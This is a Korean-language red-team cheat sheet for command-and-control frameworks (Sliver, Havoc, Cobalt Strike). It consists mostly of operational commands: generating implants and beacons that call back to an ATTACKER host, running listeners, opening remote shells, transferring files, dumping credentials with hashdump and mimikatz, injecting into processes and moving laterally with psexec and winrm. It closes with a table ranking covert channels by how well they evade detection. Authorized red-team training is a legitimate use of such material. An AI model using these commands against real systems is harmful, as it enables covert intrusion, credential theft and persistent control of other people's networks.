    C2 프레임워크

    Command & Control. 장기적인 레드팀 오퍼레이션에서 에이전트 관리, 통신, 후속 작업을 수행.

    Sliver

    Go 기반 오픈소스 C2. 현대적이고 활발히 개발 중.

    # 서버 실행
./sliver-server

# Implant 생성
sliver > generate --mtls ATTACKER --os windows --arch amd64 --save /tmp/implant.exe
sliver > generate --http ATTACKER --os linux --arch amd64 --save /tmp/implant

# Beacon 모드 (비동기)
sliver > generate beacon --mtls ATTACKER --os windows --save /tmp/beacon.exe

# 리스너
sliver > mtls -l 443
sliver > http -l 80
sliver > https -l 443

# 세션 관리
sliver > sessions
sliver > use SESSION_ID

# 주요 명령
sliver (SESSION) > info
sliver (SESSION) > getuid
sliver (SESSION) > getprivs
sliver (SESSION) > ps
sliver (SESSION) > upload /local/file /remote/path
sliver (SESSION) > download /remote/file /local/path
sliver (SESSION) > shell  # 대화형 쉘
sliver (SESSION) > execute -o whoami
sliver (SESSION) > socks5 start  # SOCKS5 프록시

    Havoc

    C/C++ 기반 모던 C2. CobaltStrike 대안.

    # Teamserver 실행
./havoc server --profile profiles/havoc.yaotl

# 클라이언트 접속
./havoc client

# Demon (에이전트) 생성
# GUI에서 Payloads > Generate

# 주요 기능
- Sleep Obfuscation
- Indirect Syscalls
- Custom User-Defined Reflective Loader
- BOF (Beacon Object File) 지원
- SOCKS5 프록시

    Cobalt Strike (상용)

    가장 널리 사용되는 상용 C2. 참고용으로 기본 명령어만 기록.

    # Beacon 기본 명령
beacon> sleep 5 50  # jitter 50%로 5초 간격
beacon> shell whoami
beacon> powershell Get-Process
beacon> upload /local/file
beacon> download C:\file
beacon> hashdump
beacon> mimikatz sekurlsa::logonpasswords
beacon> socks 1080
beacon> spawn x64
beacon> inject PID x64

# Lateral Movement
beacon> jump psexec TARGET SMB_LISTENER
beacon> jump winrm TARGET LISTENER
beacon> remote-exec psexec TARGET whoami

# BOF
beacon> inline-execute /path/to/bof.o

    C2 통신 채널 선택

    채널 장점 단점
    HTTP/HTTPS 방화벽 통과 용이 프록시/DPI 탐지 가능
    DNS 매우 은밀 느림
    SMB (Named Pipe) 내부 피봇 외부 통신 불가
    mTLS 암호화, 빠름 비표준 포트 사용
    DoH (DNS over HTTPS) DPI 우회 지원 도구 제한적
